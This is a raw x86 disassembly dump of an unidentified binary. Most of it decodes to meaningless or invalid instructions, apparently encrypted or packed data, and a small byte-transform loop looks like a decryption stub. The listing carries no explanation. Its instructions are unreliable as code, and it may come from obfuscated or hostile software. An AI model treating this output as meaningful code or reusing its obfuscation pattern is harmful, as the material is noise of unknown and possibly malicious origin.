  4176f0:	imul   edx,DWORD PTR [ebp+0x7922f620],0xa665a939
  4176fa:	je     0x417749
  4176fc:	jnp    0x41773f
  4176fe:	adc    eax,0x81610970
  417703:	mov    al,dl
  417705:	into   
  417706:	cld    
  417707:	fcomp  QWORD PTR [edi]
  417709:	pop    esi
  41770a:	cmp    ebx,DWORD PTR [ebx]
  41770c:	push   edx
  41770d:	inc    ebx
  41770e:	and    DWORD PTR [esi+0x67c9e456],ebp
  417714:	adc    BYTE PTR [eax+edi*4-0x7f],dh
  417718:	div    BYTE PTR [edx-0x18]
  41771b:	es sub al,0xa9
  41771e:	gs retf 0xc050
  417722:	mov    al,0xf8
  417724:	and    edi,DWORD PTR [edx-0x30f379f2]
  41772a:	bound  ebx,QWORD PTR [eax-0x75]
  41772d:	rcl    DWORD PTR [edx+0x7e],0x39
  417731:	(bad)  
  417732:	mov    ds:0xb0ac8167,al
  417737:	jge    0x417780
  417739:	adc    BYTE PTR [edx-0x20],bl
  41773c:	sbb    al,0x18
  41773e:	push   0xb
  417740:	or     ch,BYTE PTR [ebx+0x4898d0df]
  417746:	sub    bl,BYTE PTR [edi+0x66]
  417749:	push   edx
  41774a:	fwait
  41774b:	xchg   esp,eax
  41774c:	jns    0x4177b0
  41774e:	xor    BYTE PTR [esi],cl
  417750:	inc    edi
  417751:	jmp    0x41771a
  417753:	mov    ds:0x887d4736,al
  417758:	xor    edi,DWORD PTR [ebx+0x36]
  41775b:	retf   0x6269
  41775e:	mov    es,WORD PTR [ebp+ecx*2+0x476b5fc6]
  417765:	into   
  417766:	sbb    al,0xbf
  417768:	cdq    
  417769:	cmp    BYTE PTR [ecx+ebp*8-0x8acdc7e],al
  417770:	inc    edx
  417771:	(bad)  
  417772:	icebp  
  417773:	pusha  
  417774:	fs in  eax,0x2d
  417777:	jns    0x417788
  417779:	inc    ebx
  41777a:	pusha  
  41777b:	and    edx,DWORD PTR [edx-0x487794bf]
  417781:	idiv   eax
  417783:	xchg   esi,eax
  417784:	push   ebp
  417785:	cmp    edi,esp
  417787:	bound  edi,QWORD PTR ds:0xac8dc0a8
  41778d:	lods   eax,DWORD PTR ds:[esi]
  41778e:	xchg   edi,eax
  41778f:	stos   DWORD PTR es:[edi],eax
  417790:	mov    edi,0xd42d82a0
  417795:	jmp    0xafbd4a5d
  41779a:	and    BYTE PTR [edx],dh
  41779c:	in     eax,0x1e
  41779e:	xchg   ecx,eax
  41779f:	sbb    eax,0x2cb20c8f
  4177a4:	pop    esi
  4177a5:	dec    esi
  4177a6:	sbb    esp,DWORD PTR [ecx+0x7e]
  4177a9:	shl    bl,1
  4177ab:	pop    esp
  4177ac:	xchg   edi,ebx
  4177ae:	dec    eax
  4177af:	mov    ds:0x451b2e21,al
  4177b4:	sbb    dl,BYTE PTR [ecx-0x10]
  4177b7:	out    dx,eax
  4177b8:	mov    ch,0x9
  4177ba:	sbb    ebx,ebp
  4177bc:	adc    eax,0x15e3c6b0
  4177c1:	jns    0x41783d
  4177c3:	mov    dh,dl
  4177c5:	(bad)  
  4177c6:	stc    
  4177c7:	dec    eax
  4177c8:	xchg   edx,eax
  4177c9:	sub    DWORD PTR [edx+eiz*2-0x1],0x70
  4177ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177cf:	pusha  
  4177d0:	(bad)  
  4177d1:	push   edi
  4177d2:	movups XMMWORD PTR [ebp+0x7ba9089a],xmm0
  4177d9:	pop    esp
  4177da:	sbb    esp,DWORD PTR [ebp+ecx*8+0x4af86925]
  4177e1:	pop    ecx
  4177e2:	fcom   QWORD PTR [ecx+0x7d]
  4177e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177e6:	out    0x66,al
  4177e8:	cmp    ebx,DWORD PTR [edi]
  4177ea:	xchg   ebx,eax
  4177eb:	mov    bh,0x34
  4177ed:	xor    DWORD PTR es:[eax],esp
  4177f0:	dec    ecx
  4177f1:	xchg   si,ax
  4177f3:	fwait
  4177f4:	test   eax,0xe4839b7b
  4177f9:	shl    bh,cl
  4177fb:	sar    BYTE PTR [ebx+edx*2],0x92
  4177ff:	pop    edi
  417800:	and    BYTE PTR [eax],bl
  417802:	(bad)  
  417803:	iret   
  417804:	dec    ebx
  417805:	dec    ebx
  417806:	push   ds
  417807:	(bad)  
  417808:	jmp    0x417795
  41780a:	push   ebx
  41780b:	sahf   
  41780c:	aaa    
  41780d:	push   edx
  41780e:	cs into 
  417810:	dec    esi
  417811:	jg     0x4177c8
  417813:	pop    esi
  417814:	xchg   esp,eax
  417815:	inc    ebp
  417816:	mov    ecx,0x193131bc
  41781b:	cmp    esp,DWORD PTR [eax-0x45]
  41781e:	pop    edx
  41781f:	jecxz  0x4177ce
  417821:	cmp    esi,esp
  417823:	imul   edx,DWORD PTR [ecx+0x7d],0x6
  417827:	dec    ebp
  417828:	popf   
  417829:	in     al,dx
  41782a:	xor    ebp,DWORD PTR [esi+0x56fdf0c0]
  417830:	and    ch,BYTE PTR [ecx]
  417832:	outs   dx,BYTE PTR ds:[esi]
  417833:	lea    ecx,[esi]
  417835:	frstor [ebp-0x46ec19ba]
  41783b:	lods   eax,DWORD PTR ds:[esi]
  41783c:	and    BYTE PTR [ecx],0xf5
  41783f:	int3   
  417840:	imul   edx,DWORD PTR [ebx-0x3c],0x93a9230a
  417847:	setb   BYTE PTR [edi-0x57a926f7]
  41784e:	(bad)  
  41784f:	mov    eax,0x5cd8ca1e
  417854:	xchg   ebx,eax
  417855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417856:	outs   dx,WORD PTR ds:[esi]
  417858:	jns    0x4178d8
  41785a:	sub    eax,DWORD PTR [esi-0x1]
  41785d:	fwait
  41785e:	or     BYTE PTR [eax+edi*4+0x41],dl
  417862:	xchg   ecx,eax
  417863:	outs   dx,BYTE PTR ds:[esi]
  417864:	inc    ebx
  417865:	cs mov ebp,0x763cae14
  41786b:	inc    edi
  41786c:	es sbb ebx,edi
  41786f:	mov    dh,0x13
  417871:	loope  0x41786d
  417873:	iret   
  417874:	lods   eax,DWORD PTR ds:[esi]
  417875:	cmp    dl,BYTE PTR [ebp-0x26ef25e3]
  41787b:	xor    al,0x3b
  41787d:	gs aas 
  41787f:	jno    0x41788e
  417881:	xor    edi,DWORD PTR [ebx-0xf]
  417884:	push   esi
  417885:	cmp    al,0x64
  417887:	mov    ds:0xbdfbc4a6,eax
  41788c:	dec    ecx
  41788d:	cmp    ecx,esi
  41788f:	scas   al,BYTE PTR es:[edi]
  417890:	or     eax,0x79d1de45
  417895:	test   DWORD PTR [ecx-0x55],ecx
  417898:	test   al,0xb8
  41789a:	ret    0x2ade
  41789d:	jge    0x417875
  41789f:	pusha  
  4178a0:	(bad)  
  4178a1:	jnp    0x417855
  4178a3:	ror    BYTE PTR [esi-0x43de8c1e],0x16
  4178aa:	pop    ecx
  4178ab:	cli    
  4178ac:	and    BYTE PTR [ecx-0x2612adf7],dh
  4178b2:	add    ah,BYTE PTR [esp+eiz*8+0x28]
  4178b6:	or     edi,DWORD PTR [esi+0x25]
  4178b9:	add    dh,bh
  4178bb:	jl     0x41787f
  4178bd:	shr    DWORD PTR [esi+0x5cb4d695],cl
  4178c3:	(bad)  
  4178c4:	mov    al,ds:0x54e7824e
  4178c9:	popa   
  4178ca:	scas   eax,DWORD PTR es:[edi]
  4178cb:	dec    ecx
  4178cc:	xchg   esi,eax
  4178cd:	call   0x5756:0x80cd773f
  4178d4:	scas   al,BYTE PTR es:[edi]
  4178d5:	das    
  4178d6:	test   al,0x93
  4178d8:	xchg   ecx,eax
  4178d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178da:	scas   al,BYTE PTR es:[edi]
  4178db:	popa   
  4178dc:	mov    al,0xca
  4178de:	sub    esi,DWORD PTR [esi+0x4e]
  4178e1:	std    
  4178e2:	mov    edi,0x5f265fdc
  4178e7:	outs   dx,DWORD PTR ds:[esi]
  4178e8:	loope  0x417878
  4178ea:	ud2    
  4178ec:	clc    
  4178ed:	aam    0x23
  4178ef:	mov    BYTE PTR [edx],al
  4178f1:	xchg   edi,eax
  4178f2:	xchg   edx,eax
  4178f3:	dec    edi
  4178f4:	leave  
  4178f5:	cmp    ecx,DWORD PTR ds:0x4b483e96
  4178fb:	sbb    cl,cl
  4178fd:	adc    eax,0xdaa76b7c
  417902:	sahf   
  417903:	ja     0x417918
  417909:	movzx  eax,BYTE PTR [ebp-0x1]
  41790d:	sub    eax,0xee
  417912:	mov    BYTE PTR [ebp-0x1],al
  417915:	ror    BYTE PTR [ebp-0x1],1
  417918:	mov    al,BYTE PTR [ebp-0x1]
  41791b:	mov    BYTE PTR [ecx+edi*1],al
  41791e:	inc    ecx
  41791f:	cmp    ecx,edx
  417921:	jb     0x41751f
  417927:	jmp    0x417cb1
  41792c:	into   
  41792d:	or     esp,DWORD PTR [esi-0x3d]
  417930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417931:	mov    bh,0x6f
  417933:	pop    ss
  417934:	in     eax,0x65
  417936:	adc    DWORD PTR [ecx],esi
  417938:	pop    esi
  417939:	inc    edi
  41793a:	pop    ebp
  41793b:	inc    ebp
  41793c:	js     0x417938
  41793e:	sar    DWORD PTR [ebx-0x44443a70],0x89
  417945:	shl    BYTE PTR [eax],0x11
  417948:	rcl    DWORD PTR [ecx+0x32],1
  41794b:	jmp    0xcfe1:0xfafbe342
  417952:	mov    eax,ds:0x70b51de8
  417957:	sbb    BYTE PTR [ebx],0xe7
  41795a:	fcomp  DWORD PTR [ecx-0x21]
  41795d:	cmp    al,0x1f
  41795f:	jl     0x417927
  417961:	sub    al,0xd1
  417963:	mov    dl,0x5e
  417965:	mov    WORD PTR [edx],gs
  417967:	inc    edx
  417968:	ja     0x417979
  41796a:	pop    ds
  41796b:	neg    ebx
  41796d:	sub    dh,ah
  41796f:	adc    ch,dl
  417971:	(bad)  [ebx-0x32d56481]
  417977:	das    
  417978:	push   esp
  417979:	mov    eax,ds:0xfd6f4d67
  41797e:	xchg   esi,eax
  41797f:	dec    edi
  417980:	push   edi
  417981:	xchg   bl,cl
  417983:	push   edi
  417984:	sbb    DWORD PTR [ecx+edi*4],ebx
  417987:	mov    edi,0xe8c57af6
  41798c:	push   esi
  41798d:	std    
  41798e:	ret    
  41798f:	sub    BYTE PTR [ecx+0x6a315316],dh
  417995:	mul    DWORD PTR cs:0xd264cc9f
  41799c:	pop    edx
  41799d:	sub    al,0xa4
  41799f:	jbe    0x4179f8
  4179a1:	push   es
  4179a2:	add    al,0xdc
  4179a4:	inc    esp
  4179a5:	pop    edi
  4179a6:	aaa    
  4179a7:	aaa    
  4179a8:	mov    al,ds:0xfd4e693e
  4179ad:	stc    
  4179ae:	cli    
  4179af:	dec    esp
  4179b0:	push   0xffffff83
  4179b2:	adc    ebx,edi
  4179b4:	xchg   ecx,eax
  4179b5:	(bad)  
  4179b6:	popf   
  4179b7:	dec    ebp
  4179b8:	jl     0x41794a
  4179ba:	(bad)  
  4179bc:	daa    
  4179bd:	gs sbb eax,0x14d0bbb4
  4179c3:	or     BYTE PTR [ecx-0x60606eda],ah
  4179c9:	xor    bh,cl
  4179cb:	mov    ah,0x1
  4179cd:	scas   al,BYTE PTR es:[edi]
  4179ce:	cmp    al,0xd9
  4179d0:	in     eax,dx
  4179d1:	fdivr  st(4),st
  4179d3:	jmp    0x417972
  4179d5:	out    dx,eax
  4179d6:	sbb    al,0x64
  4179d8:	cmp    DWORD PTR [edi],0x4a00d862
  4179de:	push   cs
  4179df:	fdiv   DWORD PTR [ecx+0x0]
  4179e2:	mov    cl,BYTE PTR [edx]
  4179e4:	xchg   ebp,eax
  4179e5:	push   cs
  4179e6:	push   ds
  4179e7:	in     eax,0xd4
  4179e9:	sti    
  4179ea:	xchg   ebx,eax
  4179eb:	adc    bl,BYTE PTR [ebp-0x758613e1]
  4179f1:	aad    0xf3
  4179f3:	popf   
  4179f4:	jb     0x417a57
  4179f6:	es cwde 
  4179f8:	push   ss
  4179f9:	sbb    eax,0xef3f74ef
  4179fe:	and    al,0xa3
  417a00:	outs   dx,DWORD PTR ds:[esi]
  417a01:	int3   
  417a02:	(bad)  
  417a03:	das    
  417a04:	imul   esp,DWORD PTR [edi+0x77],0xffffff89
  417a08:	pop    edx
  417a09:	add    ch,BYTE PTR [ebx+eax*4]
  417a0c:	cli    
  417a0d:	inc    ecx
  417a0e:	outs   dx,DWORD PTR ds:[esi]
  417a0f:	sti    
  417a10:	mov    esp,0x1345e901
  417a15:	add    al,0x9b
  417a17:	jnp    0x4179a4
  417a19:	xor    al,BYTE PTR [edx+0x349b27a8]
  417a1f:	and    eax,0x2e6b1d2d
  417a24:	xchg   esi,eax
  417a25:	ret    
  417a26:	cmp    al,0x36
  417a28:	daa    
  417a29:	mov    bl,0x20
  417a2b:	bound  eax,QWORD PTR [eax]
  417a2d:	pushf  
  417a2e:	in     eax,0x42
  417a30:	mov    ebx,0xb46431d7
  417a35:	iret   
  417a36:	inc    esp
  417a37:	add    BYTE PTR [esi],ah
  417a39:	xchg   ch,dh
  417a3b:	das    
  417a3c:	jecxz  0x4179ca
  417a3e:	popf   
  417a3f:	sub    eax,0x33c07fc8
  417a44:	ins    DWORD PTR es:[edi],dx
  417a45:	(bad)  
  417a47:	scas   eax,DWORD PTR es:[edi]
  417a48:	dec    ebp
  417a49:	sbb    esi,DWORD PTR [ebx]
  417a4b:	jo     0x417a0f
  417a4d:	shr    ch,1
  417a4f:	dec    ebx
  417a50:	sbb    BYTE PTR [ebx],ch
  417a52:	pop    edx
  417a53:	popa   
  417a54:	(bad)  [edx+0x32]
  417a57:	cli    
  417a58:	shl    bh,0xb7
  417a5b:	cmp    BYTE PTR [esi+edx*8+0x1b3b89f9],bh
  417a62:	jecxz  0x4179e7
  417a64:	push   0xffffffa4
  417a66:	add    BYTE PTR [ebp+ebp*2-0x4110e5b5],dl
  417a6d:	pop    edx
  417a6e:	pop    ss
  417a6f:	add    eax,0x32451930
  417a74:	ds aam 0x7f
  417a77:	jg     0x417abd
  417a79:	(bad)  
  417a7a:	aam    0xfd
  417a7c:	fnsave [esi-0x4cb1414d]
  417a82:	xor    ch,BYTE PTR [edx-0x6c]
  417a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a86:	test   al,0x33
  417a88:	data16 sub BYTE PTR [eax-0x1d23ce52],dl
  417a8f:	xlat   BYTE PTR ds:[ebx]
  417a90:	bound  ebx,QWORD PTR [edi+ecx*2-0x68c12905]
  417a97:	sbb    BYTE PTR [esi-0x2c9ab82c],ch
  417a9d:	dec    ebx
  417a9e:	and    DWORD PTR [edi],0x64
  417aa1:	ror    BYTE PTR [esi+0x673ccc3f],cl
  417aa7:	push   ecx
  417aa8:	dec    ecx
  417aa9:	dec    ebp
  417aaa:	jo     0x417b2b
  417aac:	mov    ds:0x30559f8b,al
  417ab1:	mov    dl,0x23
  417ab3:	jns    0x417adf
  417ab5:	push   es
  417ab6:	aam    0x45
  417ab8:	fldcw  WORD PTR [eax]
  417aba:	lahf   
  417abb:	sbb    DWORD PTR [eax-0x46ebd384],esp
  417ac1:	cwde   
  417ac2:	or     DWORD PTR [ebx],eax
  417ac4:	aaa    
  417ac5:	out    dx,al
  417ac6:	data16 mov bh,0xa9
  417ac9:	clc    
  417aca:	push   eax
  417acb:	adc    eax,0x9838d8ea
  417ad0:	imul   eax,DWORD PTR [ebx+edx*8+0x771af575],0x42
  417ad8:	sub    cl,BYTE PTR [ebp+edx*4+0x56a676e2]
  417adf:	pop    edx
  417ae0:	xchg   ecx,eax
  417ae1:	xchg   ebx,eax
  417ae2:	fisubr DWORD PTR [eax]
  417ae4:	ret    0xa2f0
  417ae7:	pop    ebp
  417ae8:	or     eax,0x91c13345
  417aed:	and    eax,0x204a6b82
  417af2:	in     al,0xc5
  417af4:	push   edi
  417af5:	mov    al,ds:0x88a1e2c9
  417afa:	push   0x9a77997e
  417aff:	test   BYTE PTR [ecx],cl
  417b01:	aam    0x84
  417b03:	pop    ebp
  417b04:	xor    edx,ebp
  417b06:	and    DWORD PTR [eax-0x45],edi
  417b09:	jo     0x417b48
  417b0b:	jmp    0x417aaf
  417b0d:	retf   0x22e5
  417b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b11:	jnp    0x417af3
  417b13:	and    ebp,DWORD PTR [eax+0x6]
  417b16:	cmp    ecx,DWORD PTR ds:0x917fc3d4
  417b1c:	add    eax,0xa8af17b3
  417b21:	push   ds
  417b22:	mov    ch,0xa5
  417b24:	icebp  
  417b25:	pusha  
  417b26:	xchg   esi,eax
  417b27:	gs sbb dl,bh
  417b2a:	pop    edx
  417b2b:	sbb    ebx,DWORD PTR ds:0x68b5483
  417b31:	das    
  417b32:	shl    DWORD PTR [eax],0x3e
  417b35:	and    al,0x52
  417b37:	push   esi
  417b38:	add    DWORD PTR [edx],esp
  417b3a:	ins    BYTE PTR es:[edi],dx
  417b3b:	mov    bl,0x8e
  417b3d:	aam    0xae
  417b3f:	dec    esi
  417b40:	hlt    
  417b41:	lea    esp,[ecx+0x4d]
  417b44:	mov    bh,0x59
  417b46:	rcr    ebx,1
  417b48:	out    dx,al
  417b49:	mov    ecx,gs
  417b4b:	add    eax,0x47b5f5b4
  417b50:	ret    
  417b51:	aaa    
  417b52:	in     eax,dx
  417b53:	inc    edi
  417b54:	or     al,BYTE PTR [eax+eax*1-0x688fd812]
  417b5b:	daa    
  417b5c:	ss jl  0x417b27
  417b5f:	popa   
  417b60:	gs sti 
  417b62:	adc    ch,bh
  417b64:	shl    ecx,cl
  417b66:	xor    al,0xfb
  417b68:	mov    ds:0xf3d9f56c,eax
  417b6d:	into   
  417b6e:	xchg   ebp,eax
  417b6f:	cwde   
  417b70:	dec    eax
  417b71:	shl    ebp,0x1b
  417b74:	add    bh,BYTE PTR [ebx-0x60]
  417b77:	ud0    ebp,DWORD PTR [eax+0x5b2eae14]
  417b7e:	mov    ds:0x4f3e1a4c,eax
  417b83:	pop    esi
  417b84:	(bad)  
  417b85:	lea    ecx,[esi-0xf5f7d16]
  417b8b:	sbb    eax,edi
  417b8d:	pushf  
  417b8e:	es js  0x417bd9
  417b91:	adc    BYTE PTR [esi+0x4a50ba67],bl
  417b97:	push   0x7b212f21
  417b9c:	push   esi
  417b9d:	xor    DWORD PTR [ebx-0x25007740],0x5785db19
  417ba7:	loopne 0x417b84
  417ba9:	dec    eax
  417baa:	cmp    eax,0x250c306f
  417baf:	dec    ecx
  417bb0:	mov    dl,0x66
  417bb2:	mov    bl,0xd7
  417bb4:	xlat   BYTE PTR ds:[ebx]
  417bb5:	push   esi
  417bb6:	xor    cl,BYTE PTR [ecx]
  417bb8:	sbb    eax,0x47e9d527
  417bbd:	(bad)  [eax-0x48b6fe95]
  417bc3:	jmp    0x74b272c1
  417bc8:	fiadd  DWORD PTR [ecx]
  417bca:	pop    esi
  417bcb:	pop    ds
  417bcc:	lea    edx,[ebp*2-0xf94617c]
  417bd3:	data16 outs dx,BYTE PTR ds:[esi]
  417bd5:	or     ebp,DWORD PTR [edx-0x40]
  417bd8:	pop    ss
  417bd9:	xor    eax,0xbc3884ed
  417bde:	mov    ch,0xe8
  417be0:	adc    DWORD PTR [ecx+edi*4+0x23dea7a2],ecx
  417be7:	mov    BYTE PTR [eax-0x4636d37],dh
  417bed:	dec    ecx
  417bee:	(bad)  
  417bef:	xchg   ecx,eax
  417bf0:	adc    eax,DWORD PTR [ebx-0x4c3c146a]
  417bf6:	mov    bh,0x1
  417bf8:	test   BYTE PTR [eax-0x22],cl
  417bfb:	pop    es
  417bfc:	jp     0x417ba5
  417bfe:	(bad)  
  417bff:	jae    0x417bc9
  417c01:	outs   dx,DWORD PTR ds:[esi]
  417c02:	mov    al,bl
  417c04:	lea    edx,[ebp-0x1978c940]
  417c0a:	jmp    0xc843:0x8adeb77e
  417c11:	inc    eax
  417c12:	mov    ebp,0xe8b6a07e
  417c17:	or     ecx,ebx
  417c19:	shl    DWORD PTR [eax],0x8d
  417c1c:	jmp    0x417c4b
  417c1e:	pop    ds
  417c1f:	jae    0x417c20
  417c21:	mov    ch,0x9
  417c23:	pop    ds
  417c24:	dec    edx
  417c25:	xor    al,0x66
  417c27:	jnp    0x417bdd
  417c29:	mov    ds,WORD PTR [ebx-0x1f59a889]
  417c2f:	jo     0x417bf3
  417c31:	imul   DWORD PTR [ecx+ebp*2-0x69]
  417c35:	in     eax,dx
  417c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c37:	mov    cs,WORD PTR [esi-0x47]
  417c3a:	sub    eax,0x2bc1baf9
  417c3f:	push   cs
  417c40:	(bad)  
  417c41:	out    dx,eax
  417c42:	jmp    0x417be3
  417c44:	add    DWORD PTR [ebp-0x9],ecx
  417c47:	int3   
  417c48:	jecxz  0x417c2f
  417c4a:	inc    edi
  417c4b:	je     0x417cae
  417c4d:	jno    0x417c5c
  417c4f:	mov    ebx,0x299a3bd8
  417c54:	fwait
  417c55:	test   DWORD PTR [esi-0x59],edi
  417c58:	das    
  417c59:	ins    BYTE PTR es:[edi],dx
  417c5a:	mov    ebp,0x11db81ff
  417c5f:	sub    bh,BYTE PTR [ebx-0x55699def]
  417c65:	scas   eax,DWORD PTR es:[edi]
  417c66:	or     al,0xff
  417c68:	sub    bh,BYTE PTR [esi-0x58]
  417c6b:	aaa    
  417c6c:	sbb    al,0x18
  417c6e:	rcl    DWORD PTR [ebp+esi*4+0x61],0x3f
  417c73:	js     0x417c5f
  417c75:	mov    BYTE PTR [ebx+0x4b],cl
  417c78:	retf   
  417c79:	pop    es
  417c7a:	inc    edi
  417c7b:	dec    ecx
  417c7c:	ss icebp 
  417c7e:	xchg   esp,eax
  417c7f:	aam    0xaa
  417c81:	jg     0x417c25
  417c83:	cmc    
  417c84:	mov    ds:0x2ab89caa,eax
  417c89:	retf   0xa306
  417c8c:	adc    BYTE PTR [ecx+0x15],ch
  417c8f:	push   es
  417c90:	call   0x37ed:0x34a9a691
  417c97:	ins    BYTE PTR es:[edi],dx
  417c98:	xchg   ebx,eax
  417c99:	das    
  417c9a:	int3   
  417c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c9c:	inc    esi
  417c9d:	xor    ah,BYTE PTR [eax-0x3f065847]
  417ca3:	and    eax,0x38a70bca
  417ca8:	clc    
  417ca9:	test   ax,0x622d
  417cad:	mov    bl,0x1f
  417caf:	pop    ebp
  417cb0:	dec    DWORD PTR ss:[ebp-0x18]
  417cb4:	jne    0x417512
  417cba:	mov    eax,DWORD PTR [ebp+0x8]
  417cbd:	mov    ecx,DWORD PTR [ebp+0xc]
  417cc0:	shrd   eax,ecx,0x2
  417cc4:	shr    ecx,0x2
  417cc7:	mov    ecx,DWORD PTR [ebp+0x8]
  417cca:	mov    edx,DWORD PTR [ebp+0xc]
  417ccd:	xor    eax,esi
  417ccf:	xor    edx,edx
  417cd1:	or     eax,edx
  417cd3:	jmp    0x41805d
  417cd8:	hlt    
  417cd9:	aam    0x81
  417cdb:	mov    esi,0xf5b48fa1
  417ce0:	and    esi,eax
  417ce2:	ins    DWORD PTR es:[edi],dx
  417ce3:	inc    ebp
  417ce4:	and    esp,DWORD PTR ss:[ecx+0x31]
  417ce8:	inc    edi
  417ce9:	add    al,0xc1
  417ceb:	mov    ebx,0xbbbbc590
  417cf0:	bound  ecx,QWORD PTR [edx+0x3a]
  417cf3:	inc    eax
  417cf4:	stos   DWORD PTR es:[edi],eax
  417cf5:	pop    ebx
  417cf6:	pop    eax
  417cf7:	xchg   ecx,eax
  417cf8:	adc    edx,esi
  417cfa:	cmp    ebp,DWORD PTR [ebx+0x18]
  417cfd:	sbb    al,BYTE PTR [ecx+0x47cd5625]
  417d03:	fisubr DWORD PTR [esi+0x16]
  417d06:	das    
  417d07:	push   cs
  417d08:	arpl   WORD PTR [esi+ecx*4],si
  417d0b:	pop    es
  417d0c:	outs   dx,BYTE PTR ds:[esi]
  417d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d0e:	int    0x12
  417d10:	outs   dx,BYTE PTR ds:[esi]
  417d11:	aas    
  417d12:	mov    ah,0x6b
  417d14:	call   0x4e6e:0x77396072
  417d1b:	jmp    0xa6bb377d
  417d20:	inc    esi
  417d21:	mov    dh,0xef
  417d23:	ficomp WORD PTR [ebx]
  417d25:	or     dl,BYTE PTR [esi+0x121a001d]
  417d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d2c:	ins    BYTE PTR es:[edi],dx
  417d2d:	stos   DWORD PTR es:[edi],eax
  417d2e:	mov    ecx,0x7122db8a
  417d33:	mov    gs,WORD PTR ds:0xf078c671
  417d39:	imul   esi,ebp,0x5cf87e09
  417d3f:	fstp   st(0)
  417d41:	out    0xd4,eax
  417d43:	inc    esp
  417d44:	mov    ch,0xc0
  417d46:	add    esi,ebx
  417d48:	clc    
  417d49:	sub    al,BYTE PTR [esi-0x30]
  417d4c:	fwait
  417d4d:	dec    edi
  417d4e:	scas   eax,DWORD PTR es:[edi]
  417d4f:	mov    ds:0xfb1acea,eax
  417d54:	sbb    BYTE PTR [edx-0x6de5783e],cl
  417d5a:	dec    esi
  417d5b:	int    0x12
  417d5d:	pusha  
  417d5e:	test   eax,0xde3d7ed6
  417d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d64:	jae    0x417d6e
  417d66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d67:	xchg   edi,eax
  417d68:	pop    ss
  417d69:	(bad)  
  417d6a:	sbb    ebp,DWORD PTR [ebx-0x61]
  417d6d:	mov    ebx,0x3df5141e
  417d72:	pop    ds
  417d73:	push   ecx
  417d74:	icebp  
  417d75:	sar    dh,cl
  417d77:	fdivr  DWORD PTR [eax-0x2fd5887f]
  417d7d:	or     al,0xe
  417d7f:	xor    al,0x42
  417d81:	fwait
  417d82:	pop    esp
  417d83:	add    ch,ah
  417d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d86:	jmp    0x6e4ffd07
  417d8b:	arpl   di,dx
  417d8d:	cmp    DWORD PTR [ecx],ecx
  417d8f:	inc    edx
  417d91:	dec    eax
  417d92:	fild   QWORD PTR [edi+0x4f]
  417d95:	add    ebx,DWORD PTR [edi+0x14]
  417d98:	int    0x63
  417d9a:	loop   0x417d5f
  417d9c:	pop    edx
  417d9d:	fwait
  417d9e:	ret    0xfb2e
  417da1:	mov    ecx,0x76db16bb
  417da6:	fdiv   QWORD PTR [edx+0x1f5b2538]
  417dac:	mov    ds:0xc97cc6f7,al
  417db1:	ja     0x417de0
  417db3:	and    BYTE PTR [ebp+0x1c6d1c2a],cl
  417db9:	adc    DWORD PTR [edi+0x1d],esi
  417dbc:	std    
  417dbd:	imul   ebp,DWORD PTR [ebx],0xfffffffd
  417dc0:	push   ss
  417dc1:	outs   dx,DWORD PTR ds:[esi]
  417dc2:	sbb    ecx,ebp
  417dc4:	imul   esp,DWORD PTR [esi+0x6d1e0022],0x65c213b
  417dce:	lea    ebp,[ecx-0x6ec4e50]
  417dd4:	jecxz  0x417dc0
  417dd6:	push   ecx
  417dd7:	repz jmp 0x731a6375
  417ddd:	retf   0x9138
  417de0:	and    al,BYTE PTR [edi+0x5b]
  417de3:	dec    edx
  417de4:	mov    bl,0xca
  417de6:	fdivr  DWORD PTR es:[edi+ebp*2]
  417dea:	lea    edx,[ebx-0x69770e73]
  417df0:	fisubr WORD PTR [esi-0x54]
  417df3:	aad    0x68
  417df5:	xchg   edi,eax
  417df6:	sub    ah,BYTE PTR [esp+ecx*1]
  417df9:	dec    esp
  417dfa:	addr16 push cs
  417dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dfd:	pop    eax
  417dfe:	imul   edx,DWORD PTR [esi-0x63],0xb1b24abe
  417e05:	adc    BYTE PTR ds:0xe261ff0f,dh
  417e0b:	or     eax,0x86880b84
  417e10:	neg    BYTE PTR [edi+0x1623408a]
  417e16:	leave  
  417e17:	jge    0x417e36
  417e19:	dec    esi
  417e1a:	enter  0x206d,0xc8
  417e1e:	or     al,0x80
  417e20:	adc    al,0xa7
  417e22:	sub    bl,ch
  417e24:	xchg   esi,eax
  417e25:	pop    ebp
  417e26:	dec    ebp
  417e27:	cwde   
  417e28:	sub    BYTE PTR ds:0xe19dc8b,dh
  417e2e:	add    al,0x53
  417e30:	cdq    
  417e31:	jmp    0x3f08:0x33b050c6
  417e38:	in     eax,dx
  417e39:	fistp  WORD PTR [eax]
  417e3b:	mov    al,0xe7
  417e3d:	lock out dx,al
  417e3f:	retf   
  417e40:	inc    esi
  417e41:	ret    
  417e42:	call   0x30798ed2
  417e47:	pop    esp
  417e48:	inc    edx
  417e49:	mov    bh,0x1b
  417e4b:	push   ebp
  417e4c:	push   ecx
  417e4d:	ins    BYTE PTR es:[edi],dx
  417e4e:	inc    ebx
  417e4f:	and    esp,DWORD PTR [esi]
  417e51:	or     cl,BYTE PTR [edx+0x55]
  417e54:	mov    ch,0x15
  417e56:	dec    ebx
  417e57:	mov    esp,0xe1b4cf94
  417e5c:	fadd   QWORD PTR ds:0x60b28d03
  417e62:	test   DWORD PTR [edi-0x3e03add8],edx
  417e68:	mov    dl,0x53
  417e6a:	adc    al,0x34
  417e6c:	loop   0x417ed6
  417e6e:	push   0x1a
  417e70:	call   0x4f4883d1
  417e75:	push   ebx
  417e76:	mov    al,ds:0xb4cb230d
  417e7b:	sub    ch,ch
  417e7d:	jmp    0x1d68:0x9c512c55
  417e84:	and    BYTE PTR [edi],al
  417e86:	fistp  DWORD PTR [eax+esi*2+0x5d]
  417e8a:	out    dx,al
  417e8b:	pop    ebp
